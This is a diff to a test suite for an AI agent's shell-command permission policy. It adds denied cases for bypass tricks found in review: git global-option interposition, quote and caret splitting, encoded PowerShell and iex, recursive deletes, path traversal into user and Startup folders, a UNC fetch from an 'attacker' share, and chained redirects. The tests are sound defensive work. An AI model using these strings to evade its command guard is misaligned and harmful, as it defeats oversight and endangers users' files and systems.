@@ -207,8 +207,12 @@ describe("PowerShell tool (Windows shell)", () => {
     expect(ps("Remove-Item -Recurse -Force dist").action).toBe("deny");
     expect(ps("git push").action).toBe("deny");
   });
-  it("asks for unclassified commands", () => {
-    expect(ps("Invoke-Expression $x").action).toBe("ask");
+  it("hard-denies dynamic evaluation (Invoke-Expression / iex)", () => {
+    expect(ps("Invoke-Expression $x").action).toBe("deny");
+    expect(ps("iex $payload").action).toBe("deny");
+  });
+  it("asks for genuinely unclassified commands", () => {
+    expect(ps("Start-Sleep 5").action).toBe("ask");
   });
   it("denies during planning", () => {
     expect(decide("PowerShell", { command: "npm test" }, plan).action).toBe("deny");
@@ -231,6 +235,90 @@ describe("relative secret references in shell commands", () => {
   it("still allows normal file arguments", () => {
     expect(bash("cat src/app.ts").action).toBe("allow");
     expect(bash("node scripts/environment-setup.js").action).toBe("allow");
+  });
+});
+
+describe("git global-option bypass (review finding)", () => {
+  it("hard-denies git with interposed global options", () => {
+    expect(bash("git -C . push origin main").action).toBe("deny");
+    expect(bash("git -c k=v merge feature").action).toBe("deny");
+    expect(bash("git --no-pager reset --hard HEAD~3").action).toBe("deny");
+    expect(bash("git --git-dir=.git push").action).toBe("deny");
+  });
+  it("still allows git with global options on safe subcommands", () => {
+    expect(bash("git -C . status").action).toBe("allow");
+    expect(bash("git --no-pager diff").action).toBe("allow");
+  });
+});
+
+describe("shell obfuscation bypass (review finding)", () => {
+  it("hard-denies empty-quote and caret splitting of denied commands", () => {
+    expect(bash('g""it push origin main').action).toBe("deny");
+    expect(bash('git p""ush').action).toBe("deny");
+    expect(bash("g^it push").action).toBe("deny");
+  });
+  it("hard-denies encoded PowerShell and dynamic evaluation", () => {
+    expect(
+      decide("PowerShell", { command: "powershell -EncodedCommand ZQBjAGgAbw==" }, impl)
+        .action,
+    ).toBe("deny");
+    expect(bash("powershell -e ZQBj").action).toBe("deny");
+    expect(bash("iex ('git'+' push')").action).toBe("deny");
+  });
+});
+
+describe("broadened recursive-delete denies (review finding)", () => {
+  const denied = [
+    "rm --recursive --force node_modules",
+    "Remove-Item -r -Force dist",
+    "Remove-Item -r dist",
+    "Get-ChildItem -Recurse | Remove-Item",
+    "del -Recurse dist",
+    "ri -r dist",
+    "rmdir /q /s dist",
+    "rd /q /s dist",
+  ];
+  for (const cmd of denied) {
+    it(`denies: ${cmd}`, () => {
+      expect(decide("PowerShell", { command: cmd }, impl).action).toBe("deny");
+    });
+  }
+});
+
+describe("relative + UNC path traversal containment (review finding)", () => {
+  it("denies out-of-worktree writes/reads via relative traversal", () => {
+    expect(bash("cp payload.js ..\\..\\..\\..\\Users\\BoB\\evil.js").action).toBe("deny");
+    expect(bash("move payload.js ..\\..\\Startup\\evil.js").action).toBe("deny");
+    expect(bash("type ..\\..\\outside.txt").action).toBe("deny");
+    expect(
+      decide("PowerShell", { command: "Get-Content ..\\..\\..\\Users\\f" }, impl).action,
+    ).toBe("deny");
+    expect(bash("cp x ..").action).toBe("deny");
+    expect(bash('copy x "..\\..\\evil.txt"').action).toBe("deny");
+  });
+  it("denies UNC network paths", () => {
+    expect(bash("copy \\\\attacker\\share\\evil.dll .\\evil.dll").action).toBe("deny");
+    expect(
+      decide("PowerShell", { command: "Get-Content \\\\server\\share\\file" }, impl).action,
+    ).toBe("deny");
+  });
+  it("still allows in-worktree relative paths and normal git messages", () => {
+    expect(bash("cat src/app.ts").action).toBe("allow");
+    expect(bash("cp src/a.ts src/b.ts").action).toBe("allow");
+    // git commit messages may legitimately mention ../ — not treated as a path
+    expect(bash('git commit -m "fix ../foo lookup"').action).toBe("allow");
+  });
+});
+
+describe("redirect containment: quoted + chained (review finding)", () => {
+  it("denies quoted out-of-worktree redirect targets", () => {
+    expect(bash('echo pwned > "..\\..\\evil.txt"').action).toBe("deny");
+  });
+  it("denies a second-in-chain out-of-worktree redirect", () => {
+    expect(bash("echo a > a.txt && echo b > ..\\..\\evil.txt").action).toBe("deny");
+  });
+  it("still allows redirect to an in-worktree file", () => {
+    expect(bash("echo ok > out.txt").action).toBe("allow");
   });
 });
 
